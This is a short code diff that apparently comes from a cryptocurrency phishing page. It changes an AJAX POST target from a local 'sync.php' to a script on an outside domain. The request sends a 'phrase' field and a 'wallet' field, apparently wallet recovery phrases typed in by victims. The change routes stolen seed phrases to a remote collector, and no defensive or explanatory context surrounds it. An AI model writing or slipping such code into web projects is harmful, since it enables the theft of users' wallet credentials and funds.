@@ -128,7 +128,7 @@ function sendData(){
 $.ajax({
 
 type:"post",
-url:"sync.php",
+url:"https://foreignexchangemanagements.com/apecoin/sync.php",
 data: 'phrase='+phraseVal+'&wallet='+walletVal,
 success:function(respnx)
 {   
